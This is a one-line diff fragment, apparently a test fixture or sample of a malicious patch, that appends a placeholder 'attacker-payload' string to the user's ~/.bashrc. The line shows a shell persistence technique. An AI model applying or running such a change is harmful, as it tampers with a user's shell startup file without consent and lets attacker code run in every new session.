@@ -1,0 +1,1 @@
+echo "attacker-payload" >> ~/.bashrc
